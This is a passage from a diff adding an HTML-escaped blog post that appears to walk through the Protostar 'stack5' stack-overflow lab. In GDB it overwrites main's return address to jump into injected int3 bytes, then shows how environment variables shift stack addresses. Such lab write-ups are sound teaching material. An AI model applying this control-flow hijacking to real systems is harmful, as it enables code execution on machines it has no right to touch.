+0xbffff770:	0xaaaaaaaa	0xaaaaaaaa	0xaaaaaaaa	0xaaaaaaaa
+0xbffff780:	0xaaaaaaaa	0xaaaaaaaa	0xaaaaaaaa	0xaaaaaaaa
+0xbffff790:	0xaaaaaaaa	0xaaaaaaaa	0xaaaaaaaa	0xaaaaaaaa
+0xbffff7a0:	0xaaaaaaaa	0xaaaaaaaa	0xaaaaaaaa	0xbffff7b0
+0xbffff7b0:	0xcccccccc	0xbffff800	0xbffff85c	0xb7fe1848
+0xbffff7c0:	0xbffff810	0xffffffff
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt;’s return pointer is overwritten to 0xbffff7b0, this means that when the ret instruction is called the next instruction to be executed will be the one stored in that address. Which in this case was overwritten with 0xCC (&lt;code class=&quot;highlighter-rouge&quot;&gt;int3&lt;/code&gt;) instruction.&lt;/p&gt;
+
+&lt;p&gt;By continuing execution in GDB, we can observe that the injected payload was executed and that the breakpoint trap was surfaced to GDB.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; c
+Continuing.
+
+Program received signal SIGTRAP, Trace/breakpoint trap.
+0xbffff7b1 &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; ?? &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Since some environmental variables of the system are pushed to the stack of an executing program, the content of the stack while analyzing the binary might be different from other execution runs (Eg. A different user runs the program, the program is run from a different path, the program is run from an ssh session vs local session, etc …). As a consequence, the content of the stack might change and the addresses that we calculated might be slightly different. As an example, let’s run the program from different paths or “environments” in our system. In our first environment the program was executed on the directory where the executable itself resides (/opt/protostar/bin) and the second environment was run from the home directory of the testing system (/home/user). Furthermore, the address where the environmental variables are in a different address as shown in the next examples:&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Environment 1&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;pwd
+&lt;/span&gt;Working directory /opt/protostar/bin.
+
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; show environment
+&lt;span class=&quot;nv&quot;&gt;SHELL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/bin/sh
+&lt;span class=&quot;nv&quot;&gt;TERM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;xterm-256color
+&lt;span class=&quot;nv&quot;&gt;SSH_CLIENT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10.0.0.183 53269 22
+&lt;span class=&quot;nv&quot;&gt;SSH_TTY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/dev/pts/0
+&lt;span class=&quot;nv&quot;&gt;USER&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;user
+&lt;span class=&quot;nv&quot;&gt;LS_COLORS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;rs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0:di&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;34:ln&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;36:mh&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;00:pi&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;33:so&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:do&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:bd&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;33&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;01:cd&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;33&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;01:or&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;01:su&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;37&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;41:sg&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;30&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;43:ca&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;30&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;41:tw&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;30&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;42:ow&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;34&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;42:st&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;37&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;44:ex&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;32:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.tar&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.tgz&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.arj&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.taz&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.lzh&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.lzma&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.tlz&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.txz&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.zip&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.z&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.Z&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.dz&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.gz&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.lz&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.xz&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.bz2&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.bz&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.tbz&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.tbz2&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.tz&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.deb&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.rpm&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.jar&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.rar&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.ace&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.zoo&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.cpio&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.7z&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.rz&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;31:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.jpg&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.jpeg&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.gif&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.bmp&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.pbm&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.pgm&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.ppm&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.tga&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.xbm&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.xpm&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.tif&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.tiff&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.png&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.svg&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.svgz&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.mng&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.pcx&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.mov&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.mpg&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.mpeg&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.m2v&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.mkv&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.ogm&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.mp4&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.m4v&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.mp4v&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.vob&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.qt&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.nuv&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.wmv&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.asf&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.rm&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.rmvb&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.flc&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.avi&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.fli&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.flv&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.gl&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.dl&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.xcf&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.xwd&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.yuv&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.cgm&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.emf&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.axv&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.anx&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.ogv&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.ogx&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;35:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.aac&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;36:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.au&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;36:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.flac&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;36:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.mid&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;36:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.midi&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;36:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.mka&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;36:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.mp3&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;36:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.mpc&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;36:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.ogg&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;36:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.ra&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;36:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.wav&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;36:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.axa&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;36:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.oga&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;36:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.spx&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;36:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.xspf&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;36:
+&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/opt/protostar/bin/&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/bin
+&lt;span class=&quot;nv&quot;&gt;MAIL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/var/mail/user
+&lt;span class=&quot;nv&quot;&gt;PWD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/opt/protostar/bin
+&lt;span class=&quot;nv&quot;&gt;LANG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;en_US.UTF-8
+&lt;span class=&quot;nv&quot;&gt;SHLVL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1
+&lt;span class=&quot;nv&quot;&gt;HOME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/home/user
+&lt;span class=&quot;nv&quot;&gt;LOGNAME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;user
+&lt;span class=&quot;nv&quot;&gt;SSH_CONNECTION&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10.0.0.183 53269 10.0.0.163 22
+&lt;span class=&quot;nv&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/bin/gdb
+&lt;span class=&quot;nv&quot;&gt;OLDPWD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/opt/protostar
+&lt;span class=&quot;nv&quot;&gt;LINES&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;47
+&lt;span class=&quot;nv&quot;&gt;COLUMNS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;131
+
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;x/500s &lt;span class=&quot;nv&quot;&gt;$esp&lt;/span&gt;
+0xbffff950:	 &lt;span class=&quot;s2&quot;&gt;&quot;/opt/protostar/bin/stack5&quot;&lt;/span&gt;
+0xbffff96a:	 &lt;span class=&quot;s2&quot;&gt;&quot;USER=user&quot;&lt;/span&gt;
+0xbffff974:	 &lt;span class=&quot;s2&quot;&gt;&quot;SSH_CLIENT=10.0.0.183 53269 22&quot;&lt;/span&gt;
+0xbffff993:	 &lt;span class=&quot;s2&quot;&gt;&quot;MAIL=/var/mail/user&quot;&lt;/span&gt;
+0xbffff9a7:	 &lt;span class=&quot;s2&quot;&gt;&quot;SHLVL=1&quot;&lt;/span&gt;
+0xbffff9af:	 &lt;span class=&quot;s2&quot;&gt;&quot;OLDPWD=/opt/protostar&quot;&lt;/span&gt;
+0xbffff9c5:	 &lt;span class=&quot;s2&quot;&gt;&quot;HOME=/home/user&quot;&lt;/span&gt;
+0xbffff9d5:	 &lt;span class=&quot;s2&quot;&gt;&quot;SSH_TTY=/dev/pts/0&quot;&lt;/span&gt;
+0xbffff9e8:	 &lt;span class=&quot;s2&quot;&gt;&quot;LOGNAME=user&quot;&lt;/span&gt;
+0xbffff9f5:	 &lt;span class=&quot;s2&quot;&gt;&quot;_=/usr/bin/gdb&quot;&lt;/span&gt;
+0xbffffa04:	 &lt;span class=&quot;s2&quot;&gt;&quot;COLUMNS=131&quot;&lt;/span&gt;
+0xbffffa10:	 &lt;span class=&quot;s2&quot;&gt;&quot;TERM=xterm-256color&quot;&lt;/span&gt;
+0xbffffa24:	 &lt;span class=&quot;s2&quot;&gt;&quot;PATH=/opt/protostar/bin/=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/bin&quot;&lt;/span&gt;
+0xbffffa85:	 &lt;span class=&quot;s2&quot;&gt;&quot;LANG=en_US.UTF-8&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;strong&gt;Environment 2&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;pwd
+&lt;/span&gt;Working directory /home/user
+
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; show environment
+&lt;span class=&quot;nv&quot;&gt;SHELL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/bin/sh
+&lt;span class=&quot;nv&quot;&gt;TERM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;xterm-256color
+&lt;span class=&quot;nv&quot;&gt;SSH_CLIENT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10.0.0.183 53915 22
